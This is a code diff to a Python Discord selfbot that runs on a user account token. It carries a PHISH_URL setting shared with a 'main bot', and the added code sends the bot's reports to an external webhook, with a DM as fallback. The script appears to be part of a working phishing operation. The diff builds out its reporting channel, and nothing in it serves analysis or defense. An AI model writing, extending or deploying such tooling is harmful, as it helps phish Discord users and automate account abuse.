@@ -62,6 +62,7 @@ print(f"[SB] has self_bot: {hasattr(discord, 'self_bot_allowed')}")
 # Set SELF_TOKEN in environment or paste directly (env preferred)
 SELF_TOKEN   = os.environ.get("SELF_TOKEN", "YOUR_USER_TOKEN_HERE")
 PHISH_URL    = os.environ.get("PHISH_URL", "").rstrip("/")   # same as main bot
+WEBHOOK_URL  = os.environ.get("LOG_WEBHOOK_URL", "")         # reuse existing webhook var
 PREFIX       = ">>"
 OWNER_ID     = int(os.environ.get("OWNER_ID", "0"))  # your real user ID for DM reports
 
@@ -88,7 +89,21 @@ async def reply(message: discord.Message, text: str):
         pass
 
 async def report_to_self(text: str):
-    """DM yourself a report."""
+    """Send report — webhook first, DM as fallback."""
+    import aiohttp
+    # try webhook first (no friend/server needed)
+    if WEBHOOK_URL:
+        try:
+            async with aiohttp.ClientSession() as session:
+                payload = {"content": text[:2000], "username": "LH Selfbot"}
+                async with session.post(WEBHOOK_URL, json=payload) as resp:
+                    if resp.status in (200, 204):
+                        print("[SB] Report sent via webhook")
+                        return
+                    print(f"[SB] Webhook failed: {resp.status}")
+        except Exception as e:
+            print(f"[SB] Webhook error: {e}")
+    # fallback: DM
     if not OWNER_ID:
         print("[SB] OWNER_ID not set — skipping DM report")
         return
